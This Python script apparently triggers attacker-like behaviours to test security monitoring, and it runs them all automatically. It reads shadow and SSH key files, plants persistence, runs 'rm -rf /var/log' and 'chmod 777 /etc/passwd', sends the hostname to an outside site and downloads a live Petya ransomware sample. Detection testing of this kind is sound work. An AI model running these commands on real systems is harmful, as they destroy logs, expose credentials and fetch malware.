import glob
import os
import random
import socket
import string
import subprocess
import threading
from os.path import expanduser
import requests


def run_command(command: str):
    if command.count(" "):
        command = command.split(" ")
    else:
        command = [command]

    subprocess.Popen(command)


def read_shadow():
    with open('/etc/shadow') as f:
        f.read()


def read_passwd():
    with open('/etc/passwd') as f:
        f.read()


def write_to_root():
    with open('/root/malicous_file', 'w') as f:
        f.write('alal')


def read_bash_history():
    with open('/root/.bash_hisotry') as f:
        f.read()


def sshd():
    with open('/etc/pam.d/sshd') as f:
        f.read()


def read_ssh_keys():
    home = expanduser("~")

    keys = ['{}/.ssh/id_rsa', '{}/.ssh/id_rsa.pub']

    for i in keys:
        try:
            with open(i.format(home)) as f:
                f.read()
        except:
            pass

    for i in keys:
        try:
            with open(i.format('root')) as f:
                f.read()
        except:
            pass


def exeucte_kubectl():
    run_command("kubectl")


def create_cron():
    with open('/var/spool/cron/crontabs/lala', 'w') as f:
        f.write('lalala')


def insmod():
    run_command("insmod")


def write_under_etc():
    with open('/etc/rc.local', 'a+') as f:
        f.write('lalala')


def chmod():
    run_command("chmod 777 /etc/passwd")


def setcap():
    run_command('setcap')


def systemd():
    paths = ["/etc/systemd/system/",
             "/usr/lib/systemd/system/",
             "{}/.config/systemd/user/".format(expanduser('~'))]
    for i in paths:
        try:
            i = i + 'lala'
            with open(i, 'w') as f:
                f.write('lala')
        except:
            pass


def trap():
    run_command("trap")


def edit_bashrc():
    paths = ["/root/.bashrc",
             "{}/.bashrc".format(expanduser('~'))]
    for i in paths:
        try:
            with open(i, 'a') as f:
                f.write('lala')
        except:
            pass


def edit_bash_profile():
    paths = ["/root/.bash_profile",
             "{}/.bash_profile".format(expanduser('~'))]
    for i in paths:
        try:
            with open(i, 'a') as f:
                f.write('lala')
        except:
            pass


def clear_bash_history():
    paths = ["/root/.bash_history",
             "{}/.bash_history".format(expanduser('~'))]
    for i in paths:
        try:
            run_command(f"rm -f {i}")
        except:
            pass


def sshpass():
    run_command("sshpass")


def ssh():
    run_command("ssh")


def clear_logs():
    run_command("rm -rf /var/log")


def compile_gcc():
    run_command("gcc")


def compile_clang():
    run_command("clang")


def go_compile():
    run_command("go run")


def nsenter():
    run_command("nsenter")


def change_configuration():
    paths = ["/etc/audisp/audispd.conf", "/etc/auditd.conf", "/etc/audit/auditd.conf", "/etc/libaudit.conf"]
    for i in paths:
        try:
            with open(i, 'a+') as f:
                f.write('lala')
        except:
            pass


def chown():
    run_command("chown 777 /etc/passwd")


def modprobe():
    run_command("modprobe")


def nc():
    run_command("nc")


def tshark():
    run_command("tshark")


def tcpdump():
    run_command("tcpdump")


def arp():
    run_command("arp")


def aws():
    run_command("aws")


def useradd():
    run_command("useradd")


def userdel():
    run_command("userdel")


def telnet():
    run_command("telnet")


def curl():
    run_command("curl")


def wget():
    run_command("wget")


def exfiltrate_hostname():
    hostname = socket.gethostname()
    url = "https://www.ynet.co.il/"
    requests.get(url, params=hostname)


def download_malicous_file():
    url = 'https://raw.githubusercontent.com/ytisf/theZoo/master/malware/Binaries/Ransomware.Petya/Ransomware.Petya.zip'
    ransomware = requests.get(url, stream=True)
    with open('ransomware', 'wb') as f:
        for chunk in ransomware.iter_content(chunk_size=1024):
            if chunk:
                f.write(chunk)


RANDOM_PATTERN = "ozoravyzvbwmcuqhzlygnlkixjnltzqtjqquasijnsptvioaum"  # 500 files
HUGE_RANDOM_FILE_PATTERN = "rpktxzaszegntdjtqjdkmignjenzssdhlyhaaucurqnijxoghm"
THREADED_PROCESS_EXECUTION = "ekcymnevacgcafrabczyxfyhkrckiszknhsteoaxtnmahbbego"
letters = string.ascii_lowercase


def get_dir_structure(root_dir):
    dirs = set()
    for filename in glob.iglob(root_dir + '**/*', recursive=True):
        dirs.add(filename.rsplit('/', 1)[0])

    return dirs


def random_network_traffic():
    urls = ["https://web.telegram.org/",
            "https://oast.fun/",
            "https://plague.fun/",
            "https://discord.com/",
            "https://www.google.com/",
            "https://www.ynet.co.il/",
            "https://www.walla.co.il/",
            "https://www.geeksforgeeks.org/multithreading-python-set-1/"]

    for i in range(500):
        random_string = RANDOM_PATTERN + (''.join(random.choice(letters) for i in range(20)))
        requests.get(urls[i % len(urls)], params=random_string)


def random_file_write():
    dirs = list(get_dir_structure('/'))
    indexes = random.sample(range(0, len(dirs)), 500)
    for i in indexes:
        with open(os.path.join(dirs[i], RANDOM_PATTERN), 'w') as f:
            f.write(RANDOM_PATTERN)


def random_process_execute():
    processes = [x for x in glob.iglob('/usr/bin' + '**/*', recursive=True) if x not in []]
    indexes = random.sample(range(0, len(processes)), 100)
    for i in indexes:
        run_command(f"{processes[i]} {RANDOM_PATTERN}")


def threaded_process_execution():
    processes = [x for x in glob.iglob('/usr/bin' + '**/*', recursive=True) if x not in []]
    indexes = random.sample(range(0, len(processes)), 30)
    for i in indexes:
        threading.Thread(target=run_command, args=(f"{processes[i]} {THREADED_PROCESS_EXECUTION}",))


def huge_process_parameter():
    processes = [x for x in glob.iglob('/usr/bin' + '**/*', recursive=True) if x not in []]
    indexes = random.sample(range(0, len(processes)), 10)
    for i in indexes:
        run_command(f"{processes[i]} {HUGE_RANDOM_FILE_PATTERN} {(random.choice(letters) for i in range(5000000))}")


def huge_file_payload():
    dirs = list(get_dir_structure('/'))
    indexes = random.sample(range(0, len(dirs)), 50)
    for i in indexes:
        with open(os.path.join(dirs[i], HUGE_RANDOM_FILE_PATTERN), 'w') as f:
            f.write((''.join(random.choice(letters) for i in range(5000000))))


def random_behavior_stresser():
    random_network_traffic()
    random_file_write()
    random_process_execute()
    threaded_process_execution()
    huge_process_parameter()
    huge_file_payload()

def execute_function(foo):
    try:
        foo()
    except:
        pass


def user_add_openssl():
    command = "useradd -p $(openssl passwd -1 password) username"
    run_command(command)


test_list = [read_shadow,
             read_passwd,
             write_to_root,
             read_bash_history,
             sshd,
             read_ssh_keys,
             exeucte_kubectl,
             create_cron,
             insmod,
             write_under_etc,
             setcap,
             systemd,
             trap,
             edit_bashrc,
             edit_bash_profile,
             clear_bash_history,
             sshpass,
             ssh,
             clear_logs,
             compile_gcc,
             compile_clang,
             go_compile,
             nsenter,
             change_configuration,
             chmod,
             chown,
             modprobe,
             nc,
             tshark,
             tcpdump,
             arp,
             aws,
             useradd,
             userdel,
             telnet,
             curl,
             wget,
             exfiltrate_hostname,
             download_malicous_file,
             user_add_openssl,
             random_behavior_stresser]

for test in test_list:
    execute_function(test)
